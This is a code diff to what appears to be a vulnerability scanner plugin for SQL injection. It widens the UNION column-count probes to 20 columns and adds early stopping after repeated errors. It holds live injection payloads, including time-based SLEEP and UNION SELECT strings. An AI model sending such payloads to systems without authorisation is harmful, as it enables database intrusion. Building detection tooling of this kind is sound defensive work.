@@ -109,16 +109,10 @@ _TIME_PAYLOADS = [
     (f"' AND (SELECT * FROM (SELECT(SLEEP({_TIME_DELAY})))a)-- -", "mysql_subquery_sleep"),
 ]
 
-# ── UNION-based payloads ───────────────────────────────────────────────
+# ── UNION-based payloads (up to 20 columns) ───────────────────────────
 _UNION_COLUMN_PROBES = [
-    "' UNION SELECT NULL-- -",
-    "' UNION SELECT NULL,NULL-- -",
-    "' UNION SELECT NULL,NULL,NULL-- -",
-    "' UNION SELECT NULL,NULL,NULL,NULL-- -",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
+    "' UNION SELECT " + ",".join(["NULL"] * n) + "-- -"
+    for n in range(1, 21)
 ]
 
 # ── Stacked queries ────────────────────────────────────────────────────
@@ -401,9 +395,16 @@ class Check(Plugin):
                     # Skip if parameter is not dynamic — a static parameter
                     # can't produce meaningful probe differences.
                     if not any(r["endpoint"] == endpoint and r["param"] == param for r in sqli_results) and param_is_dynamic:
-                        for i, union_payload in enumerate(_UNION_COLUMN_PROBES[:6]):
+                        consecutive_errors = 0
+                        for i, union_payload in enumerate(_UNION_COLUMN_PROBES):
                             path = f"{endpoint}?{param}={urllib.parse.quote(union_payload)}"
                             st, body, _ = await _http_request(host, port, "GET", path, use_tls=tls)
+                            if st in (0, 404, 405) or st >= 500:
+                                consecutive_errors += 1
+                                if consecutive_errors >= 3:
+                                    break  # Not injectable via UNION, stop probing
+                                continue
+                            consecutive_errors = 0
                             if st == 200 and len(body) > len(bl_body) * 0.8:
                                 # Check if response differs from error (column count matched)
                                 prev_path = f"{endpoint}?{param}={urllib.parse.quote(_UNION_COLUMN_PROBES[max(0,i-1)])}" if i > 0 else ""
